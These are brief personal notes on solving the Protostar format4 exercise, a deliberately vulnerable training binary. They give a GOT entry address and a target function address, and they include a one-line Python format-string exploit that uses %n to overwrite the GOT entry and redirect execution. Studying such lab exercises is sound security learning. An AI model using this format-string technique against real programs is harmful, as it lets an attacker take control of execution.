# Protostar - format4
0x8049724 -- address of GOT TABLE OFFSET 
0x080484b4 <hello+0>    hello address   {@134513839  decimal value  + 5 }
the idea here to change the address of the entry of the GOT ≈

````BASH
python -c 'print "\x24\x97\x04\x08"+"%134513839d"+"%4$n"' | ./format4


